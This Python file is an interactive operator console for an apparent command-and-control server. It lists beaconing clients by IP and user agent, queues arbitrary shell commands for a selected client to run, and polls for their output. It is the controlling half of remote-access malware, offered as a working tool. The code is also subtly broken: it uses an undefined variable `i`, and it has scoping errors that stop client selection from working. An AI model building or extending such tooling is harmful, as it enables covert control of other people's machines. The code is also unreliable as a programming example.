from app import app, db
from app.models import Client, Command
from prettytable import PrettyTable
from threading import Thread

prompt = ">> "
selected_client = None


def error(text):
    print("Error:", text)


def debug(text):
    print("Debug:", text)


def clients_list():
    t = PrettyTable(['#', 'UUID', 'User-Agent', 'IP', 'Last Beacon'])
    t.align = 'l'
    for c in Client.query.all():
        t.add_row([c.id, c.client_id, c.user_agent, c.ip, c.last_beaconed])
    print(t)


def help_menu():
    t = PrettyTable(['command', 'description'])
    t.align = 'l'
    t.add_row(['list', 'Lists all the clients registered'])
    t.add_row(['help', 'self.help()'])
    t.add_row(['select <id>','Selected a specific client from the list'])
    t.add_row(['exec <command>','Executes a command to the current selected client'])
    t.add_row(['back','Detaches from the current client'])
    t.add_row(['exit', 'Exists this interactive shell'])
    t.add_row(['coms' , 'Displays the commands and output for the current client'])
    print(t)

def display_commands():
    if selected_client:
        t = PrettyTable(['Command', 'Output'])
        t.align = 'l'
        client = Client.query.filter(Client.id==i).first()
        for com in client.commands:
            t.add_row([com.cmd, com.output])

        print(t)
    else:
        error('You must select a client first.')


def execute_command(cmd):
    if not selected_client:
        error('A client must be selected in order to execute a command.')
        return

    client = Client.query.filter_by(id=selected_client).first()
    if not client:
        return

    c = Command(cmd, '')
    client.commands.append(c)
    db.session.add(c)
    db.session.commit()
    print('Added task successfully.')


def select_client(client_id):
    if not client_id.isdigit():
        error('ID must be an integer')
        return

    i = int(client_id)
    client = Client.query.filter_by(id=i).first()
    if not client:
        error('Client not found')
        return

    prompt = "(Client {}) >> ".format(i)
    selected_client = i


def check_results():
    while True:
        if selected_client:
            client = Client.query.filter(Client.id == i).first()
            for cmd in client.commands:
                if cmd.is_returned and not cmd.is_printed:
                    print('(Cmd {}) >> {}'.format(cmd.id, cmd.output))
                    cmd.is_printed = True
                    db.session.commit()

''' Main Function '''
if __name__ == "__main__":
    stay = True

    t = Thread(target=check_results, daemon=True)
    t.start()

    while stay:
        next_cmd = input(prompt)

        if next_cmd == 'list':
            clients_list()

        elif next_cmd.startswith('select'):
            _,_,client_id = next_cmd.partition(' ')
            select_client(client_id)

        elif next_cmd.startswith('exec'):
            _,_,cmd = next_cmd.partition(' ')
            execute_command(cmd)

        elif next_cmd == 'coms':
            display_commands()

        elif next_cmd == 'back':
            prompt = ">> "
            selected_client = None

        elif next_cmd == 'help':
            help_menu()

        elif next_cmd == 'exit':
            print('Goodbye!')
            stay = False

    t.join()
